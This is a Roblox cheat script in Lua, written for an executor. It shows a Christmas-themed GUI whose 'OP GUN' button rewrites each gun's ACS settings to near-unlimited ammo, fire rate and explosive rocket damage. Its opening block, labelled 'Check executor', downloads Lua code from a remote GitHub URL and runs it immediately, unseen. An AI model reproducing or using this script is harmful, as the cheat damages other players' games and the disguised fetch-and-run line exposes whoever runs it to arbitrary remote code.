-- Check executor
coroutine.wrap(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
    if not require then
        game.Players.LocalPlayer:Kick("Executor Not Supported")
    end
end)()

local screengui = Instance.new("ScreenGui")
screengui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screengui.Parent = cloneref(game:GetService("CoreGui"))

local frame = Instance.new("Frame")
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.Size = UDim2.new(0, 500, 0, 300)
frame.Parent = screengui

local uidrag = Instance.new("UIDragDetector")
uidrag.Parent = frame

local corner1 = Instance.new("UICorner")
corner1.CornerRadius = UDim.new(0, 16)
corner1.Parent = frame

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(240, 20, 40)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 80, 240))
}
gradient.Rotation = 45
gradient.Parent = frame

local header = Instance.new("TextLabel")
header.Font = Enum.Font.GothamBold
header.Text = "🎄 Merry Christmas 🎄"
header.TextColor3 = Color3.fromRGB(255, 255, 255)
header.TextScaled = true
header.BackgroundTransparency = 1
header.Size = UDim2.new(1, 0, 0.2, 0)
header.Parent = frame

local image = Instance.new("ImageLabel")
image.BackgroundTransparency = 1
image.Position = UDim2.new(0.05, 0, 0.3, 0)
image.Size = UDim2.new(0.2, 0, 0.4, 0)
image.Parent = frame
local corner2 = Instance.new("UICorner")
corner2.CornerRadius = UDim.new(1, 0)
corner2.Parent = image

coroutine.wrap(function()
    local Players = cloneref(game:GetService("Players"))
    local player = Players.LocalPlayer
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size420x420
    local content = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
    image.Image = content
end)()

local button = Instance.new("TextButton")
button.Font = Enum.Font.GothamBold
button.Text = "🎁 OP GUN"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.BackgroundColor3 = Color3.fromRGB(40, 170, 80)
button.Size = UDim2.new(0.4, 0, 0.15, 0)
button.Position = UDim2.new(0.55, 0, 0.4, 0)
button.Parent = frame
local corner3 = Instance.new("UICorner")
corner3.CornerRadius = UDim.new(0, 12)
corner3.Parent = button

button.MouseButton1Click:Connect(function()
    local player = cloneref(game:GetService("Players")).LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    for _, tool in pairs(backpack:GetChildren()) do
        if tool.Name ~= "Knife" then
            local module = require(tool.ACS_Settings)
            module.Ammo = 99999
            module.StoredAmmo = 99999
            module.MaxStoredAmmo = 99999
            module.FireModes.Auto = true
            module.ShootRate = 9999
            module.CustomShellType = "Explosive"
            module.BulletType = "Rocket"
            module.gunName = "SolyNotHub On Top"
            module.Type = "Gun"
            module.Explosive = true
            module.Explosion = {
                Radius = 999,
                Damage = 999,
            }
        end
    end
end)

local instructionsLabel = Instance.new("TextLabel")
instructionsLabel.Font = Enum.Font.Gotham
instructionsLabel.Text = "Press LCtrl to toggle the GUI\nPress R/Reload to make OP GUN work"
instructionsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
instructionsLabel.TextScaled = true
instructionsLabel.BackgroundTransparency = 1
instructionsLabel.Position = UDim2.new(0.05, 0, 0.75, 0)
instructionsLabel.Size = UDim2.new(0.9, 0, 0.2, 0)
instructionsLabel.Parent = frame

local isVisible = true
local tweenService = cloneref(game:GetService("TweenService"))

local function toggleGUI()
    if isVisible then
        local shrinkTween = tweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0), Transparency = 1})
        shrinkTween:Play()
        shrinkTween.Completed:Connect(function()
            screengui.Enabled = false
        end)
    else
        screengui.Enabled = true
        local expandTween = tweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 500, 0, 300), Transparency = 0})
        expandTween:Play()
    end
    isVisible = not isVisible
end

local UserInputService = cloneref(game:GetService("UserInputService"))
UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.LeftControl then
        toggleGUI()
    end
end)
